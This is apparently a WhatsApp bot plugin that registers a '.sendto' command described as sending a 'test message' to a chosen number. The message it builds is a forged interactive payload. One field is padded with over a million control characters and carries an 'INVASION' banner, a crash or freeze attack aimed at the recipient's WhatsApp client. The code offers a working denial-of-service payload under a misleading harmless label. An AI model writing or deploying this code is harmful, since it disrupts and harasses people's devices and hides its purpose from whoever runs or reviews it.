const config = require('../config');
const { cmd, commands } = require('../command');


cmd({
    pattern: "sendto", // Command trigger
    alias: ["send"], // Aliases
    use: '.sendto <number>', // Example usage
    react: "📤", // Emoji reaction
    desc: "Send a test message to a specific number.", // Description
    category: "utility", // Command category
    filename: __filename // Current file name
},

async (conn, mek, m, { from, reply, args }) => {
    try {
        // Extract the number from the command
        const number = args[0];
        if (!number) {
            return reply("*Please provide a number to send the message to.*\n*Example:* `.sendto 263719647303`");
        }

        // Construct the message object
        const Qrad = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        };

        // Send the message to the specified number
        await conn.sendMessage(`${number}@s.whatsapp.net`, Qrad);

        // Confirm the message was sent
        reply(`*Message sent successfully to ${number}.*`);

    } catch (error) {
        console.error("Error:", error); // Log the error
        reply("*Error: Unable to send the message. Please try again later.*");
    }
});
